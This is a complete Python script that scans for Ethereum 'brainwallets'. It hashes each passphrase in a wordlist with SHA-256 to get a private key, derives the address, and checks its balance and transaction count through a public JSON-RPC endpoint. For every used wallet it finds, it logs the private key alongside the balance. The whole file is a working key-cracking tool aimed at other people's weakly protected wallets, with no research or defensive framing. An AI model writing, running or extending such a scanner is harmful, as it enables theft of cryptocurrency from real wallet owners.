#!/usr/bin/env python3
from __future__ import annotations
import argparse, io, sys, time, logging, hashlib, binascii, json
import requests
from coincurve import PrivateKey
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- helpers ---
def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def privhex_from_passphrase(word: str) -> str:
    """Deterministic private key from passphrase (same as original behaviour)."""
    return sha256(word.encode("utf-8")).hex()

# keccak (requires pysha3)
try:
    import sha3 as _sha3  # pysha3
    def keccak_256(data: bytes) -> bytes:
        k = _sha3.keccak_256()
        k.update(data)
        return k.digest()
except Exception:
    raise RuntimeError("pysha3 required: pip install pysha3")

def eth_address_from_privhex(priv_hex: str) -> str:
    """Return EIP-55 checksum address (0x...) from private key hex."""
    pk = PrivateKey(bytes.fromhex(priv_hex))
    pub_uncompressed = pk.public_key.format(compressed=False)  # 65 bytes, 0x04 + X + Y
    if len(pub_uncompressed) != 65 or pub_uncompressed[0] != 0x04:
        raise RuntimeError("Unexpected public key format")
    keccak_hash = keccak_256(pub_uncompressed[1:])  # drop 0x04
    addr_bytes = keccak_hash[-20:]
    addr_hex = addr_bytes.hex()
    return checksum_eth_address("0x" + addr_hex)

def checksum_eth_address(addr: str) -> str:
    """EIP-55 checksum implementation. Input may be 0x... or lowercased."""
    addr_noprefix = addr.lower().replace("0x", "")
    hash_hex = keccak_256(addr_noprefix.encode("ascii")).hex()
    out = "0x"
    for c, h in zip(addr_noprefix, hash_hex):
        out += c.upper() if int(h, 16) >= 8 else c
    return out

# --- RPC helpers ---
def rpc_post(session: requests.Session, rpc_url: str, method: str, params: list, timeout: float = 15.0):
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    r = session.post(rpc_url, json=payload, timeout=timeout)
    r.raise_for_status()
    j = r.json()
    if "error" in j:
        raise RuntimeError(f"RPC error: {j['error']}")
    return j.get("result")

def hex_to_int(h: str) -> int:
    if h is None:
        return 0
    try:
        return int(h, 16)
    except Exception:
        return 0

# --- printing / output ---
def print_used_eth(word, addr, priv_hex, balance_wei, txcount, fout):
    print("\n=== USED ETH WALLET FOUND ===")
    print(f"WORD: {word}")
    print(f"ADDRESS: {addr}")
    print(f"PRIVHEX: {priv_hex}")
    print(f"BALANCE (wei): {balance_wei}")
    print(f"TXCOUNT: {txcount}")
    print("============================\n")
    fout.write(f"{word},ETH,{addr},{priv_hex},{balance_wei},{txcount}\n")
    fout.flush()

# --- checks ---
def check_eth(session: requests.Session, rpc_url: str, addr: str, sleep: float = 0.5):
    """Return tuple (balance_wei:int, txcount:int)."""
    # balance
    try:
        res_bal = rpc_post(session, rpc_url, "eth_getBalance", [addr, "latest"])
        balance_wei = hex_to_int(res_bal)
    except Exception as e:
        logging.debug("eth_getBalance error for %s: %s", addr, e)
        balance_wei = 0
    time.sleep(sleep)
    # tx count (nonce)
    try:
        res_tx = rpc_post(session, rpc_url, "eth_getTransactionCount", [addr, "latest"])
        txcount = hex_to_int(res_tx)
    except Exception as e:
        logging.debug("eth_getTransactionCount error for %s: %s", addr, e)
        txcount = 0
    time.sleep(sleep)
    return balance_wei, txcount

# === Main scanner ===
def main():
    ap = argparse.ArgumentParser(description="Simple Ethereum passphrase scanner (passphrase->sha256->privkey->address)")
    ap.add_argument("--dict", "-d", default="dictionaryeth.txt", help="wordlist (one passphrase per line)")
    ap.add_argument("--out", "-o", default="found.txt", help="append CSV output")
    ap.add_argument("--sleep", type=float, default=0.4, help="seconds to sleep between RPC calls")
    ap.add_argument("--rpc", default="https://cloudflare-eth.com", help="Ethereum JSON-RPC endpoint (default: cloudflare)")
    ap.add_argument("--debug", action="store_true", help="debug logging")
    ap.add_argument("--workers", type=int, default=4, help="max concurrent workers for checking (per-word concurrency)")
    args = ap.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")

    try:
        fdict = io.open(args.dict, "rt", encoding="utf-8", errors="ignore")
    except Exception as e:
        logging.error("Cannot open dictionary: %s", e)
        sys.exit(1)
    try:
        fout = open(args.out, "a", encoding="utf-8", buffering=1)
    except Exception as e:
        logging.error("Cannot open output file: %s", e)
        sys.exit(1)

    session = requests.Session()
    total = checked = found = 0
    start_time = time.time()
    current_word = None

    try:
        for raw in fdict:
            word = raw.strip()
            current_word = word
            if not word:
                continue
            total += 1
            try:
                priv_hex = privhex_from_passphrase(word)
                addr = eth_address_from_privhex(priv_hex)
            except Exception as e:
                logging.debug("Derivation failed for '%s': %s", word, e)
                continue

            # Check balance and txcount (we can run these sequentially or in small threadpool)
            try:
                balance_wei, txcount = check_eth(session, args.rpc, addr, sleep=args.sleep)
            except Exception as e:
                logging.debug("Check failed for %s: %s", addr, e)
                balance_wei, txcount = 0, 0

            checked += 1
            # consider used if txcount > 0 or balance > 0
            if balance_wei > 0 or txcount > 0:
                logging.info("Found used ETH address %s (balance=%s txcount=%s)", addr, balance_wei, txcount)
                print_used_eth(word, addr, priv_hex, balance_wei, txcount, fout)
                found += 1

            if total % 1000 == 0:
                elapsed = time.time() - start_time
                logging.info("Processed %d words — checked:%d found:%d — avg %.2f words/s",
                             total, checked, found, total / max(1.0, elapsed))

    except KeyboardInterrupt:
        print("\n*** INTERRUPTED by user ***")
        if current_word:
            print(f"Stopped while processing word: {current_word!r}")
    finally:
        session.close()
        fdict.close()
        fout.close()
        elapsed = time.time() - start_time
        logging.info("Finished. Total read: %d, checked:%d found:%d, elapsed %.1fs", total, checked, found, elapsed)

if __name__ == "__main__":
    main()